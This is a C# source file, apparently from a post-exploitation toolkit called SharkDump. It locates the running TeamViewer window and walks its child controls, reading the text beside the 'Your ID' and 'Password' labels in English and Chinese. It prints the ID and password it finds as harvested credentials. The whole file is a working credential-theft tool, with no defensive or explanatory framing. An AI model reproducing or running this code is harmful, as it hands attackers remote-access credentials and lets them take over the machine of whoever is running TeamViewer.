using System;
using System.Text;

namespace SharkDump.TeamViewer
{
    public class TVDump
    {
        public static String GetText(IntPtr win)
        {
            int length = WindowsApi.GetWindowTextLength(win);
            StringBuilder sb = new StringBuilder(2 * length + 1);
            WindowsApi.GetWindowText(win, sb, sb.Capacity);
            string strTitle = sb.ToString();
            return strTitle;
        }

        const int WM_GETTEXT = 0x000D;
        const int WM_GETTEXTLENGTH = 0x000E;


        public static string GetControlText(IntPtr hWnd)
        {

            // Get the size of the string required to hold the window title (including trailing null.) 
            Int32 titleSize = WindowsApi.SendMessage((int)hWnd, WM_GETTEXTLENGTH, 0, 0).ToInt32();
            // If titleSize is 0, there is no title so return an empty string (or null)
            if (titleSize == 0)
                return String.Empty;
            StringBuilder title = new StringBuilder(titleSize + 1);
            WindowsApi.SendMessage(hWnd, (int)WM_GETTEXT, title.Capacity, title);
            return title.ToString();
        }

        public static void GetAllWin(IntPtr win)
        {
            IntPtr winSubPtr2 = WindowsApi.GetWindow(win, GetWindowCmd.GW_CHILD);
            while (winSubPtr2 != IntPtr.Zero)
            {

                //Console.WriteLine(winSubPtr2.ToString() + " : "+GetClass(winSubPtr2));
                if (GetText(winSubPtr2) == "您的ID" || GetText(winSubPtr2) ==  "Your ID")
                {
                    IntPtr tmid = WindowsApi.GetWindow(winSubPtr2, GetWindowCmd.GW_HWNDNEXT);
                    if (GetControlText(tmid) != String.Empty)
                    {
                        ShowMessage("[+]", "您的ID " + GetControlText(tmid));
                    }
                }
                if (GetText(winSubPtr2) == "密码" || GetText(winSubPtr2) == "Password")
                {
                    IntPtr tmmima = WindowsApi.GetWindow(winSubPtr2, GetWindowCmd.GW_HWNDNEXT);
                    if(GetControlText(tmmima) != String.Empty)
                    {
                        ShowMessage("[+]", "密码 " + GetControlText(tmmima));
                    }
                }
                GetAllWin(winSubPtr2);
                winSubPtr2 = WindowsApi.GetWindow(winSubPtr2, GetWindowCmd.GW_HWNDNEXT);
            }
        }


        public static void GetPass()
        {

            ShowMessage("[*]", "Try to get TeamViewer Credential");
            IntPtr tvHwnd = WindowsApi.FindWindow(null, "TeamViewer");
            if (tvHwnd != IntPtr.Zero)
            {
                IntPtr winParentPtr = WindowsApi.GetWindow(tvHwnd, GetWindowCmd.GW_CHILD);
                GetAllWin(tvHwnd);
            }
            ShowMessage("[*]", "Get TeamViewer Credential end");

        }

        public static void ShowMessage(string s, string mess)
        {
            Console.WriteLine("{0}: {1}", s, mess);
        }
    }
}
